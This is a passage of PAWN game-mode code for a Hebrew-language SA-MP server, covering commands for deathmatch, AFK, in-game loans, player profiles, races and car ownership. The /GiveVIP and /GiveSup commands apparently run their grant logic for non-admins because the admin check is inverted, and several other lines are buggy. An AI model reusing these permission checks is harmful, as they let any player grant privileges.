if(InDM[playerid] >0) return SendClientMessage(playerid,red,"/qdmz - אתה נמצא באיזור די-אם על מנת לבצע פקודות שנית");
if(isafk[playerid] == 1) return SendClientMessage(playerid,red,"/UNAFK על מנת לצאת מהמצב בצע/י .AFK Time אתה כבר במצע ");
new Randm = random(sizeof(WDMPostion));

CreateTeleport(playerid,0,WDMPostion[Randm][0], WDMPostion[Randm][1], WDMPostion[Randm][2]+20.0,87.6602,0);
InDM[playerid] = 2;
ResetPlayerWeapons(playerid);
SetPlayerVirtualWorld(playerid,3);
SetPlayerInterior(playerid,0);
GivePlayerWeapon(playerid,24,99999);
GivePlayerWeapon(playerid,27,99999);
GivePlayerWeapon(playerid,30,99999);
GivePlayerWeapon(playerid,33,99999);
return 1;
}

if (strcmp(cmdtext, "/qdmz", true)==0)
{
if(InDM[playerid] < 1) return SendClientMessage(playerid,red,".אתה לא נמצא באיזור - די-אם");
ResetPlayerWeapons(playerid);
SetPlayerPos(playerid,1022.1641,-1133.3300,23.8281);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
SetTimerEx("QDMZ",4*1000,0,"i",playerid);
return 1;
}
if (strcmp("/afk", cmdtext, true) == 0)
{
if(isafk[playerid] == 1) return SendClientMessage(playerid,red,"/UNAFK על מנת לצאת מהמצב בצע/י .AFK Time אתה כבר במצע ");
isafk[playerid] = 1;
TogglePlayerControllable(playerid,0);
SendClientMessage(playerid, red, ".כעת אתה רשאי לעשות את עיניינך ללא חשש .AFK נכנסת למצב");
return 1;
}

if (strcmp("/unafk", cmdtext, true) == 0)
{
if(isafk[playerid] == 0) return SendClientMessage(playerid,red,".AFKאתה לא נמצא ב");
isafk[playerid] = 0;
TogglePlayerControllable(playerid,1);
SetCameraBehindPlayer(playerid);
SendClientMessage(playerid, COLOR_LIGHTGREEN, ".כעת אתה יכול לחזור לשחק .AFK - יצאת ממצב");
return 1; //return value
}
//---

if(strcmp(cmd, "/kill", true) == 0)
{
aDoing[playerid] ++;
if(aDoing[playerid] > 1) return SendClientMessage(playerid,red,"אנא המתן מספר שניות לביצוע פקודה זאת שנית");

PlayerInfo[playerid][Deaths] = PlayerInfo[playerid][Deaths] --;
antianti[playerid] = 0;
SetPlayerHealth(playerid,0.0);
mini[playerid] = 0;
SendClientMessage(playerid,COLOR_YELLOW, ".התאבדת");

return 1;
}

new moneysaA[MAX_PLAYERS];
///KopatGemel]
if(strcmp(cmd, "/aGemel", true) == 0)
{
if (PlayerInfo[playerid][Level] < 4) return Messagelevel (playerid, 4);
if(!CPS_IsPlayerInCheckpoint(playerid,bcp)) return SendClientMessage(playerid,red,".אתה חייב להיות בבנק לביצוע פקודה זו");
if(PlayerInfo[playerid][KopatGemel] ==1) return SendClientMessage(playerid,red,".יש לך כבר השקעה בקופת הגמל");

tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(tmp)) return SendClientMessage(playerid,WHITE, "Usage: /aGemel [4000-20,000]");
moneysaA[playerid] = strval(tmp);
if(moneysaA[playerid] > 20000) return SendClientMessage(playerid, red, ".$20,000 :הסכום המקסימלי ללקיחת הלואה הוא");
if(moneysaA[playerid] < 4000) return SendClientMessage(playerid, red, ".$4,000 :סכום מינימלי");
moneysaA[playerid] = strval(tmp);
if(GetPlayerMoney(playerid) < moneysaA[playerid]) return SendClientMessage(playerid, red, ".אין לך את הסכום שציינת");

LACY_GiveMoney(playerid, -moneysaA[playerid]);
PlayerInfo[playerid][GemelLogin] = moneysaA[playerid];
PlayerInfo[playerid][KopatGemel] =1;
SendClientMessage(playerid,lblue,"~~~:קופת ההשקאות שלך ~~~");
format(string, sizeof(string),"%d :אתה השקעת בקופת הגמל שלך כ",PlayerInfo[playerid][GemelLogin]);
SendClientMessage(playerid,COLOR_PINK,string);
SendClientMessage(playerid,COLOR_PINK,".כל שעה עגולה תקבל כ-1,200 דולר לקופת ההשקאות");
return 1;
}


if(strcmp(cmd, "/getgemelm", true) == 0)
{
if (PlayerInfo[playerid][Level] < 4)return Messagelevel (playerid, 4);

if(!CPS_IsPlayerInCheckpoint(playerid,bcp)) return SendClientMessage(playerid,red,".אתה חייב להיות בבנק לביצוע פקודה זו");
if(PlayerInfo[playerid][GemelLogin] ==0) return SendClientMessage(playerid,red,".אין לך שום השקעה בבנק");

format(string, sizeof(string),".\"$%d\" קיבלת תכסף בחזרה מקופת ההשקעות תהנה",PlayerInfo[playerid][GemelLogin]);
SendClientMessage(playerid,COLOR_LIGHTGREEN,string);
LACY_GiveMoney(playerid, PlayerInfo[playerid][GemelLogin]);
PlayerInfo[playerid][GemelLogin] =0;
PlayerInfo[playerid][KopatGemel] =0;

return 1;
}

//---

if(!strcmp(cmd, "/Profile", true))
{
if(PlayerInfo[playerid][ProfileLogged] == 0) return SendClientMessage(playerid,red,".לא הגדרת פרופיל");
format(string, sizeof(string), "~~~ %s's :פרטי השחקן שלך ~~~",GetName(playerid));
SendClientMessage(playerid, lblue, string);
format(string, sizeof(string), "icq: %s, messnger %s, email: %s.", dini_Get(GetPlayerFile(playerid),"ICQ"), dini_Get(GetPlayerFile(playerid),"MSN"),dini_Get(GetPlayerFile(playerid),"Email"));
SendClientMessage(playerid, COLOR_GREY, string);
format(string, sizeof(string), "sex: %s, age: %d.", dini_Get(GetPlayerFile(playerid),"SEX"),PlayerInfo[playerid][AggInfo]);
SendClientMessage(playerid, COLOR_GREY, string);
return 1;
}
if(!strcmp(cmd, "/pProfile", true))
{
new sid[256], id;
sid = strtok(cmdtext,idx);
id = ReturnID(sid);
if(3 < strlen(sid)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");

if(PlayerInfo[id][ProfileLogged] ==0) return SendClientMessage(playerid,red,".שחקנ/ית זה לא הגדיר/ה תפרופיל");
if(!strlen(sid)) return SendClientMessage(playerid, COLOR_WHITE, "Usage: /pProfile [id/name]");
if(!IsPlayerConnected(id)) return SendClientMessage(playerid,red,".שחקנ/ית לא מחובר/ת");
format(string, sizeof(string), "~~~ %s :הפרטיים האישיים של ~~~",GetName(id));
SendClientMessage(playerid, lblue, string);
format(string, sizeof(string), "icq: %s, messnger %s, email: %s", dini_Get(GetPlayerFile(id),"ICQ"), dini_Get(GetPlayerFile(id),"MSN"),dini_Get(GetPlayerFile(id),"Email"));
SendClientMessage(playerid, COLOR_GREY, string);
format(string, sizeof(string), "sex: %s, age: %d", dini_Get(GetPlayerFile(id),"SEX"),PlayerInfo[id][AggInfo]);
SendClientMessage(playerid, COLOR_GREY, string);
return 1;
}

if(strcmp(cmd, "/GetLoan", true) == 0)
{
if (PlayerInfo[playerid][Level] < 4) return Messagelevel (playerid, 4);

if(!CPS_IsPlayerInCheckpoint(playerid,bcp)) return SendClientMessage(playerid,red,".אתה חייב להיות בבנק לביצוע פקודה זו");
if(PlayerInfo[playerid][GetAloan])
{
format(string, sizeof(string),"%d :אתה חייב לבנק סכום כספי של",PlayerInfo[playerid][MoneyLoan]);
SendClientMessage(playerid,COLOR_WHITE,string);

return SendClientMessage(playerid,COLOR_WHITE,".חסר לך כסף להחזרת ההלואה אנא אסוף תכסף והחזר לבנק עד אז לא תוכל להשתמש בבנק");
}

tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(tmp)) return SendClientMessage(playerid,WHITE, "Usage: /getloan [4000-20,000]");
moneysaA[playerid] = strval(tmp);
if(moneysaA[playerid] > 20000 || moneysaA[playerid] < 4000) return SendClientMessage(playerid, red, ".20,000 :הסכום המקסימלי ללקיחת הלואה הוא"),SendClientMessage(playerid,red, ".סכום שגויי");
LACY_GiveMoney(playerid, moneysaA[playerid]);
PlayerInfo[playerid][MoneyLoan] = moneysaA[playerid]; PlayerInfo[playerid][MoneyLoan] += 200; PlayerInfo[playerid][GetAloan] = 1;
format(string, sizeof(string),".\"%d$\" :לקחת הלוואה בסך \"%d$\" אתה צריך להחזיר לבנק כ",PlayerInfo[playerid][MoneyLoan],PlayerInfo[playerid][MoneyLoan]-200);
SendClientMessage(playerid,COLOR_LIGHTGREEN,string);
SendClientMessage(playerid,COLOR_PINK, ".מנהל הבנק: לא לשכוח כל 54 דק' הבנק לוקח ריבת של 200 דולר");
return dini_IntSet(GetPlayerFile(playerid),"MoneyLoan",PlayerInfo[playerid][MoneyLoan]);
}

if(!strcmp(cmd, "/BackLoan", true))
{
if(!CPS_IsPlayerInCheckpoint(playerid,bcp)) return SendClientMessage(playerid,red,".אתה חייב להיות בבנק לביצוע פקודה זו");
if(!PlayerInfo[playerid][GetAloan]) return SendClientMessage(playerid,red,".לא לקחת שום הלוואה אין מה להחזיר");
if(GetPlayerMoney(playerid) < PlayerInfo[playerid][MoneyLoan]) return format(string, sizeof(string),"%d :אתה חייב לבנק סכום כספי של",PlayerInfo[playerid][MoneyLoan]),SendClientMessage(playerid,red,string),SendClientMessage(playerid,red,".חסר לך כסף להחזרת ההלואה אנא אסוף תכסף והחזר לבנק עד אז לא תוכל להשתמש בבנק");
LACY_GiveMoney(playerid,-PlayerInfo[playerid][MoneyLoan]);
PlayerInfo[playerid][GetAloan] = 0;
PlayerInfo[playerid][MoneyLoan] = 0;
format(string, sizeof(string),".\"$%d\" :החזרת לבנק תהלוואה סכום ההחזרה",PlayerInfo[playerid][MoneyLoan]);
return SendClientMessage(playerid,COLOR_LIGHTGREEN,string);
}


if(strcmp(cmd, "/organization", true) == 0)
{
new Roy_Killer111[256];
Roy_Killer111= strtok(cmdtext, idx);
if(20 < strlen(Roy_Killer111)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(Roy_Killer111))
{
SendClientMessage(playerid, COLOR_WHITE,"Usage: /organization [function]");
SendClientMessage(playerid, COLOR_WHITE,"/organization my [organization name] :לשינוי תאג הארגון שלך");
return 1;
}

else if(strcmp(Roy_Killer111,"my",true) == 0)
{
new icqnumb[256];
CheckPlayerCMDLevel(playerid,ChangeIcq);
icqnumb = strtok(cmdtext,idx);
if(20 < strlen(icqnumb)) return SendClientMessage(playerid,COLOR_WHITE,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(icqnumb)) return SendClientMessage(playerid,WHITE,"Usage: /organization [name]");

dini_Set(GetPlayerFile(playerid),"organization",icqnumb);
format(string, sizeof(string),"\"%s\" :שינת את הארגון שלך ל",icqnumb);
SendClientMessage(playerid,COLOR_LIGHTGREEN,string);
return true;
}

return SendClientMessage(playerid,red,".שינו ארגון שגוי");
}

if(!strcmp(cmd,"/AllMapStart",true))
{
if(!IsPlayerXAdmin(playerid,10)) return SendClientMessage(playerid,red,".פקודה זאתי משמשת אדמינים בלבד");
if(AllMapRaceingOn == 1) return SendClientMessage(playerid, red, ".המירוץ יבשה התחיל נסה פעם הבאה");
AllMapRaceingOn = 1;
return AllMapRaceingStart();
}


if(!strcmp(cmd,"/JR",true))
{

if (!AllMapRaceingOn) return SendClientMessage(playerid, red, ".אין מירוץ יבשה פעיל כרגע");
if(AllMapRaceingPlayers == sizeof(RandomAllMapRace)) return SendClientMessage(playerid,red,".כל המקומות נתפסו");
if(InAllMapRaceing[playerid] > 0) return SendClientMessage(playerid,red,".אנא המתן בסבלנות Race נרשמת כבר לתחרות");
if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red,".אנא היכנס לרכב על מנת להשתתף במירוץ");

DisablePlayerRaceCheckpoint(playerid);
new vehicleid = GetPlayerVehicleID(playerid);
SetPlayerVirtualWorld(playerid,1);
SetVehicleVirtualWorld(vehicleid,1);
TogglePlayerControllable(playerid,0);
AllMapRaceingPlayers ++;
AllMapCP[playerid] = 1;
MAP_VAR_PLAYER[playerid] = AllMapRaceingPlayers;
InAllMapRaceing[playerid] =1;

SetPlayerRaceCheckpoint(playerid,0,AllMapCPs[AllMapCP[playerid]][0],AllMapCPs[AllMapCP[playerid]][1],AllMapCPs[AllMapCP[playerid]][2],AllMapCPs[AllMapCP[playerid]+1][0],AllMapCPs[AllMapCP[playerid]+1][1],AllMapCPs[AllMapCP[playerid]+1][2],30.0);
SetVehiclePos(GetPlayerVehicleID(playerid), RandomAllMapRace[MAP_VAR_PLAYER[playerid]][0], RandomAllMapRace[MAP_VAR_PLAYER[playerid]][1], RandomAllMapRace[MAP_VAR_PLAYER[playerid]][2]);
SetVehicleZAngle(GetPlayerVehicleID(playerid), RandomAllMapRace[MAP_VAR_PLAYER[playerid]][3]);

format(string,sizeof(string),".%d :הינך משתתף/ת מספר",AllMapRaceingPlayers);
SendClientMessage(playerid,0xE21E1EFF,string);
format(string,sizeof(string),".בעת התחלת הקרב, תתחיל לנסוע כמה שיותר מהר לצ'ק פוינטים האדומים על המסלול מירוץ יבשה");
return SendClientMessage(playerid,0xE21E1EFF,string);
}


if(strcmp(cmd, "/editprofile", true) == 0)
{
new Roy_Killer111[256];
Roy_Killer111= strtok(cmdtext, idx);
if(20 < strlen(Roy_Killer111)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(Roy_Killer111))
{
SendClientMessage(playerid, COLOR_WHITE,"Usage: /editprofile [function]");
SendClientMessage(playerid, COLOR_WHITE,"/editprofile open :לפתיחת פרופיל");
SendClientMessage(playerid, COLOR_WHITE,"/editprofile icq [icq/none] :לערוך את המספר אייסקיו");
SendClientMessage(playerid, COLOR_WHITE,"/editprofile messenger [messenger/none] :המסנג'ר שלך");
SendClientMessage(playerid, COLOR_WHITE,"/editprofile email [email/none] :לערוך את האימייל שלך");
SendClientMessage(playerid, COLOR_WHITE,"/editprofile age :לערוך את הגיל שלך");
SendClientMessage(playerid, COLOR_WHITE,"/editprofile sex :[כדאי לערוך את המין שלך [זכר/נקבה");
SendClientMessage(playerid, COLOR_WHITE,"/pprofile [id/name] לראות פרופיל של שחקן אחר - /profile לראות את הפרופיל שלך");

return 1;
}

if(strcmp(Roy_Killer111,"icq",true) == 0)
{
if(!PlayerInfo[playerid][ProfileLogged]) return SendClientMessage(playerid,red,".אין לך כרטיס פרופיל אישי");
new icqnumb[256];
icqnumb = strtok(cmdtext,idx);
if(20 < strlen(icqnumb)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(icqnumb)) return SendClientMessage(playerid,COLOR_WHITE,"Usage: /editprofile icq [icq/none]");

if(!IsNumeric(icqnumb)) return SendClientMessage(playerid,red,".מספר איסייקיו לא חוקי");

if(9 < strlen(icqnumb) || strlen(icqnumb) < 4)
{
format(string,sizeof(string),".4-9 אורך האייסיקיו חייב להיות בין ל");
SendClientMessage(playerid,red,string);
return 1;
}



new File:f;
if(fexist(GetPlayerFile(playerid)))
{
f = fopen(GetPlayerFile(playerid),io_append);

dini_Set(GetPlayerFile(playerid),"ICQ",icqnumb);
format(string, sizeof(string),"[%s] - :האייסקיו שלך נקבע כ",icqnumb);
SendClientMessage(playerid,0x0F482FF,string);
fclose(f);
}
}

else if(strcmp(Roy_Killer111,"open",true) == 0)
{
if(PlayerInfo[playerid][ProfileLogged] == 1) return SendClientMessage(playerid,red,".כבר יש לך כרטיס פרופיל מובנה");
SendClientMessage(playerid,COLOR_LIGHTGREEN,"/editprofile [edit] :על מנת לערוך את פרטיך השתמש בפקודה");
PlayerInfo[playerid][ProfileLogged]= 1;

new File:f;
if(fexist(GetPlayerFile(playerid)))
{
f = fopen(GetPlayerFile(playerid),io_append);

format(string,sizeof(string),"Name=%s\r\n","None"); fwrite(f,string);
format(string,sizeof(string),"LastName=%s\r\n","None"); fwrite(f,string);
format(string,sizeof(string),"ICQ=%s\r\n","None"); fwrite(f,string);
format(string,sizeof(string),"Msn=%s\r\n","None"); fwrite(f,string);
format(string,sizeof(string),"Mispht=%s\r\n","None"); fwrite(f,string);
format(string,sizeof(string),"SEX=%s\r\n","None"); fwrite(f,string);
format(string,sizeof(string),"Email=%s\r\n","None"); fwrite(f,string);
format(string,sizeof(string),"Agg=%s\r\n","None"); fwrite(f,string);

dini_IntSet(GetPlayerFile(playerid),"ProfileLogeed",1);
fclose(f);
}
return true;
}

else if(!strcmp(Roy_Killer111,"sex",true))
{

if(!PlayerInfo[playerid][ProfileLogged]) return SendClientMessage(playerid,red,".אין לך כרטיס פרופיל אישי");
new SexPlayer[256];
SexPlayer = strtok(cmdtext, idx);
if(20 < strlen(SexPlayer)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(SexPlayer)) return SendClientMessage(playerid, COLOR_WHITE, "Usage: /editprofile sex  [נקבה/זכר]");

if(strcmp(SexPlayer,"זכר",true) == 0)
{
SendClientMessage(playerid, 0x0F482FF, "[המין שלך הוגדר כ[זכר");
return dini_Set(GetPlayerFile(playerid), "SEX", "זכר");
}

else if(strcmp(SexPlayer,"נקבה",true) == 0)
{
SendClientMessage(playerid, 0x0F482FF, "[המין - שלך הוגדר כ[נקבה");
return dini_Set(GetPlayerFile(playerid), "SEX", "נקבה");
}

return SendClientMessage(playerid,red,".אנא בחר אחד מהמינים");
}

else if(strcmp(Roy_Killer111,"email",true) == 0)
{
if(!PlayerInfo[playerid][ProfileLogged]) return SendClientMessage(playerid,red,".אין לך כרטיס פרופיל אישי");
new Msnnumb[256];
CheckPlayerCMDLevel(playerid,ChangeIcq);
Msnnumb = strtok(cmdtext,idx);
if(20 < strlen(Msnnumb)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(Msnnumb)) return SendClientMessage(playerid,COLOR_WHITE,"Usage: /editprofile email [email/none]");
if(!ValidEmail(Msnnumb)) return SendClientMessage(playerid,red,".כתובת אימייל שגויה");


format(string, sizeof(string),"\"%s\"- :האיימיל שלך נקבע כ",Msnnumb);
SendClientMessage(playerid,COLOR_LIGHTGREEN,string);
return dini_Set(GetPlayerFile(playerid),"Email",Msnnumb);
}

//--Agg
else if(strcmp(Roy_Killer111,"age",true) == 0)
{
if(!PlayerInfo[playerid][ProfileLogged]) return SendClientMessage(playerid,red,".אין לך כרטיס פרופיל אישי");

if(Sagebir[playerid])
{
Sagebir[playerid]=0;
SendClientMessage(playerid,WHITE,".כעת יצאת ממצב קביעת גיל תוכל להמשיך לכתוב בצ'אט בחופשיות");
return true;
}

else if(!Sagebir[playerid])
{
SendClientMessage(playerid,lblue,"~~~ :הדרכה בשימוש מערכת גילאים ~~~");
SendClientMessage(playerid,COLOR_YELLOW,"(dd/mm/yyyy) :כעת תכתוב בצ'אט את התאריך לידה שלך דוגמא");
SendClientMessage(playerid,COLOR_YELLOW,".month = חודש -- day = יום -- year = שנה");
SendClientMessage(playerid,COLOR_YELLOW,".על מנת לקבוע את גילך תכתוב את זה בצ'אט, אל תדאג הצ'אט יצנזר ורק את תראה");
SendClientMessage(playerid,COLOR_YELLOW,"(dd/mm/yyyy) :תכתוב בצ'אט ככה d-:על מנת לדבר בצ'אט f6 לחץ");
SendClientMessage(playerid,COLOR_PINK,"/editproile age :על מנת לצאת ממצב קביעת גיל תחזור על הפקודה");
Sagebir[playerid]=1;
}
return true;
}
//---
else if(strcmp(Roy_Killer111,"messenger",true) == 0)
{
if(PlayerInfo[playerid][ProfileLogged] == 0) return SendClientMessage(playerid,red,".אין לך כרטיס פרופיל אישי");
new Msnnumb[256];
Msnnumb = strtok(cmdtext,idx);
if(20 < strlen(Msnnumb)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(Msnnumb)) return SendClientMessage(playerid,WHITE,"Usage: /editprofile msn [email]");
if(ValidEmail(Msnnumb)) return SendClientMessage(playerid,red,".כתובת מסנג'ר שגויה");

format(string, sizeof(string),"[%s] - :המסן שלך נקבע כ",Msnnumb);
SendClientMessage(playerid,0x0F482FF,string);
return dini_Set(GetPlayerFile(playerid),"Msn",Msnnumb);
}

return SendClientMessage(playerid,red,".שינוי פרופיל שגוי");
}


if(!strcmp(cmd, "/ignore", true))
{
tmp = strtok(cmdtext, idx);
if(3 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(tmp)) return SendClientMessage(playerid, COLOR_WHITE, "Usage: /ignore [playerid]");

giveplayerid = strval(tmp);
if(giveplayerid == playerid) return SendClientMessage(playerid, red, ".אתה לא יכול לחסוך את עצמך");
if(Ignore[playerid][giveplayerid] ==1) return SendClientMessage(playerid,red,".שחקן זה כבר נמצא ברשימת החסומים שלך");
if(!IsPlayerXAdmin(giveplayerid,1)) return SendClientMessage(playerid,red,".אי אפשר לחסום אדמין");
GetPlayerName(giveplayerid, playername, sizeof(playername));
format(string, sizeof(string), ".(ID: %d) \"%s\" אתה חסמת את החשקן",  giveplayerid,playername);
SendClientMessage(playerid, red, string);

return Ignore[playerid][giveplayerid] = 1;
}

if(!strcmp(cmd, "/unignore", true))
{
tmp = strtok(cmdtext, idx);
if(3 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(tmp)) return SendClientMessage(playerid, COLOR_WHITE, "Usage: /unignore [playerid]");

giveplayerid = strval(tmp);
if(giveplayerid == playerid) return SendClientMessage(playerid, red, ".אתה לא יכול להוריד חסימה לעצמך");
if(Ignore[playerid][giveplayerid] ==0) return SendClientMessage(playerid,red,".שחקן זה לא חסום אצלך");
GetPlayerName(giveplayerid, playername, sizeof(playername));
format(string, sizeof(string), ".(ID: %d) \"%s\" :אתה הורדת חסימה ל", giveplayerid,playername);
SendClientMessage(playerid, red, string);

return Ignore[playerid][giveplayerid] = 0;
}

//---
	
if(strcmp(cmd,"/GiveVIP",true) == 0)
{
if (!IsPlayerXAdmin(playerid,20))
{
tmp = strtok(cmdtext, idx);
if(3 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
new id = ReturnID(tmp);
tmp2 = strtok(cmdtext, idx);
if(3 < strlen(tmp2)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
new adlvl = strval(tmp2);
if(!strlen(tmp)) return SendClientMessage(playerid, COLOR_WHITE, "Usage: /GiveVIP [playerid] [level]");
if(!strlen(tmp2)) return SendClientMessage(playerid, COLOR_WHITE, "Usage: /GiveVIP [playerid] [level]");
if(!IsPlayerConnected(id)) return SendClientMessage(playerid, red, "Invalid PlayerID !");
PlayerInfo[id][VIPS] = adlvl;
dini_IntSet(GetPlayerFile(playerid),"VIP",PlayerInfo[id][VIPS]);
}
else
{

}
return 1;
}
//---
if(strcmp(cmd,"/GiveSup",true) == 0)
{
if (!IsPlayerXAdmin(playerid,20))
{
tmp = strtok(cmdtext, idx);
if(3 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
new id = ReturnID(tmp);
tmp2 = strtok(cmdtext, idx);
if(3 < strlen(tmp2)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
new adlvl = strval(tmp2);
if(!strlen(tmp)) return SendClientMessage(playerid, red, "Usage: /GiveSup [playerid] [level]");
if(!strlen(tmp2)) return SendClientMessage(playerid, red, "Usage: /GiveSup [playerid] [level]");
if(!IsPlayerConnected(id)) return SendClientMessage(playerid, COLOR_BLUE, "Invalid PlayerID !");
PlayerInfo[id][Supportives] = adlvl;
dini_IntSet(GetPlayerFile(id),"Supportives",PlayerInfo[id][Supportives]);
}
else
{

}
return 1;
}
//--

if(strcmp(cmd,"/HelpMe",true) == 0)
{
if(helpme[playerid] ==1) return SendClientMessage(playerid,red,".שלחת כבר בקשה , לשליחה שנית אנא המתן מספר שניות");
SendClientMessage(playerid,COLOR_GREY,".בקשתך נשלח בהצלחה לתומכים המחוברים");
helpme[playerid] =1;
for (new i = 0; i < MAX_PLAYERS; i++)
{

if (PlayerInfo[i][Supportives] >= 1)
{
format(string, sizeof(string), ".זקוק לעזרה בשרת אנא פנה אליו בהודעה פרטית או בשיחת טלפון , \"%s\"",GetName(playerid));
SendClientMessage(i, red, string);
}
}

return 1;
}




//--CCBank
if(strcmp(cmd, "/Buycc", true) == 0)
{

if (PlayerInfo[playerid][Level] < 3) return Messagelevel (playerid, 3);
if(GetPlayerMoney(playerid) < 700000) return SendClientMessage(playerid,red,".כרטיס האשראי עולה כ700000 דולר ואין לך מספיק ביד");
if(PlayerInfo[playerid][CcMode] ==1) return SendClientMessage(playerid,red,"/help cc - כבר יש לך כרטיס אשראי לעזרה");

SendClientMessage(playerid,COLOR_LIGHTGREEN,".קנית כרטיש אשראי בהצלחה");
PlayerInfo[playerid][CcMode]=1;
dini_IntSet(GetPlayerFile(playerid),"CC",1);
LACY_GiveMoney(playerid,-700000);
return 1;
}


if(strcmp(cmd, "/SellCc", true) == 0)
{
if(PlayerInfo[playerid][CcMode] ==0) return SendClientMessage(playerid,red,".אין לך בכיס כרטיס אשראי");

dini_IntSet(GetPlayerFile(playerid),"CC",0);
SendClientMessage(playerid,COLOR_LIGHTGREEN,".מכרת את הכרטיס אשראי שלך בהצלחה");
LACY_GiveMoney(playerid,35000);
PlayerInfo[playerid][CcMode]=0;
return 1;
}

new moneysa[MAX_PLAYERS];
if(!strcmp(cmd, "/withdrawc", true))
{
if(PlayerInfo[playerid][CcMode] ==0) return SendClientMessage(playerid,red,".אין לך בכיס כרטיס אשראי");
tmp = strtok(cmdtext, idx);
if(9 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(tmp)) return SendClientMessage(playerid, COLOR_WHITE, "Usage: /withdrawc [amount]");
moneysa[playerid] = strval(tmp);
if(9 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(moneysa[playerid] > PlayerInfo[playerid][Bank]) return SendClientMessage(playerid, red, ".סכום משיכה שגוי");
LACY_GiveMoney(playerid, moneysa[playerid]);
PlayerInfo[playerid][Bank] = PlayerInfo[playerid][Bank]-moneysa[playerid];
dini_IntSet(GetPlayerFile(playerid),"Bank",PlayerInfo[playerid][Bank]);
format(string, sizeof(string), "[$%d] נשאר לך בבנק כ ,[$%d] משכת מהרטיס אשראי שלך כ",  moneysa[playerid],PlayerInfo[playerid][Bank]);
SendClientMessage(playerid, COLOR_LIGHTGREEN, string);
return 1;
}
if(!strcmp(cmd, "/balancec", true))
{
format(string, sizeof(string), "[$%d] :הכסף בכרטיס אשראי שלך הוא", PlayerInfo[playerid][Bank]);
SendClientMessage(playerid, COLOR_LIGHTGREEN, string);
return 1;
}



//==============================================================================
	        if(strcmp("/car",cmdtext,true) == 0)
	        {
			if(!(IsPlayerInAnyVehicle(playerid))) return SendClientMessage(playerid,red,".אתה צריך להיות במכונית שאתה רוצה ליקנות ");
new vehicleid = GetPlayerVehicleID(playerid);
new msg[256];
if(VehicleInfo[vehicleid][CarOwned] == 1)
{
if(strcmp(PlayerName,VehicleInfo[vehicleid][CarOwner],true) == 0)
{
format(msg,sizeof(msg),"-------- [%s :פרטים עבור הרכב] --------",VehicleInfo[vehicleid][CarName]);
SendClientMessage(playerid,WHITE,msg);
format(msg,sizeof(msg),"!%s הרכב אשר אתה נמצא בוא הוא הרכב שלך",VehicleInfo[vehicleid][CarName]);
SendClientMessage(playerid,0xF06E8DFF,msg);
format(vehname,999,".%d :האיידי של הרכב",GetVehicleModel(GetPlayerVehicleID(playerid)));
SendClientMessage(playerid,lblue,vehname);
format(vehname,999,".%d :האיידי של הרכב במוד",GetPlayerVehicleID(playerid));
SendClientMessage(playerid,0x0F482FF,vehname);
if(VehicleInfo[vehicleid][SaleV] > 0)
{
SendClientMessage(playerid,lblue,"/StopSale :הרכב שלך, עדיין מוצע לקניה, על מנת להפסיק את מכירת הרכב בצע/י");
}
}
else if(strcmp(PlayerName,VehicleInfo[vehicleid][CarOwner],true) == 1)
{


if(VehicleInfo[vehicleid][SaleV] != 0)
{

format(msg,sizeof(msg),"-------- [%s :פרטים עבור הרכב] --------",VehicleInfo[vehicleid][CarName]);
SendClientMessage(playerid,WHITE,msg);
format(msg,sizeof(msg),".$%d :שים לב, בעל הרכב הציע על הרכב מחיר של כ",VehicleInfo[vehicleid][SaleV]);
SendClientMessage(playerid,0xF06E8DFF,msg);
format(msg,sizeof(msg),".%s :בעלים של הרכב שהציע את המחיר הזה",VehicleInfo[vehicleid][CarOwner]);
SendClientMessage(playerid,lblue,msg);
SendClientMessage(playerid,0xF06E8DFF,"/BuyCar :לקניית הרכב בצע/י");
format(vehname,999,".%d :האיידי של הרכב",GetVehicleModel(GetPlayerVehicleID(playerid)));
SendClientMessage(playerid,0x0F482FF,vehname);
format(vehname,999,".%d :האיידי של הרכב במוד",GetPlayerVehicleID(playerid));
SendClientMessage(playerid,lblue,vehname);



}
else
{

format(msg,sizeof(msg),".ולכן לא ניתן לקנייה %s רכב זה הינו בבעלות [%s]",VehicleInfo[vehicleid][CarOwner],VehicleInfo[vehicleid][CarName]);
SendClientMessage(playerid,lblue,msg);
}
}
}
else if(VehicleInfo[vehicleid][Buyable] == 0)
{
format(msg,sizeof(msg),".הינו רכב ציבורי אינך יכול לקנות אותו לפי הפרטים שזוהה ,%s רכב זה",VehicleInfo[vehicleid][CarName], VehicleInfo[vehicleid][CarOwner]);
SendClientMessage(playerid,0xB3111EFF,msg);
}
else if(VehicleInfo[vehicleid][Buyable] == 1)
{
format(msg,sizeof(msg),"-------- [%s :פרטים עבור הרכב] --------",VehicleInfo[vehicleid][CarName]);
SendClientMessage(playerid,WHITE,msg);
format(msg,sizeof(msg),".$%d :הרכב פנוי לרכישה, מחיר הרכב",VehicleInfo[vehicleid][Price]);
SendClientMessage(playerid,0xF06E8DFF,msg);
